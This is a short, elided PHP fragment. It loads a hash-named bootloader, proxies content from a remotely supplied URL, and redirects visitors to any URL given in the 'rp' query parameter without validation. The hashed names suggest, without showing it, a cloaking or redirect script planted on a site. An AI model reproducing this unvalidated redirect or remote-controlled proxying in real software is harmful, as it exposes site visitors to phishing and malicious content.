...
require 'bootloader_747c170cbe430929319345a3766ae4ce.php';
...
switch ($response['action']) {
    ...
    case 'reverse_proxy':
        if(!empty($_GET['rp'])) {
            reverse_proxy($response['url'], "tarp_747c170cbe430929319345a3766ae4ce/");

            header('location: '.$_GET['rp']);
            exit;
        }

        print reverse_proxy($response['url'], "tarp_747c170cbe430929319345a3766ae4ce/");
        exit;        
